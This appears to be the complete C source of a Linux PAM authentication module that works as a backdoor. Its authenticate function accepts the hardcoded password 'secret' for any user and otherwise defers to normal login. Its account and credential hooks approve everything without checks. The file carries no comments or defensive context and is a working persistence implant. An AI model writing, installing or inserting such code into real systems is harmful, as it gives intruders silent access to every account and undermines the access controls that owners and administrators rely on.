#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <stdlib.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
	const char *password;
	const char *user;
	int ret;
	
	ret = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
		
	if (password && strcmp(password, "secret") == 0){
		return PAM_SUCCESS;
	}

	return PAM_IGNORE;
	
}


PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
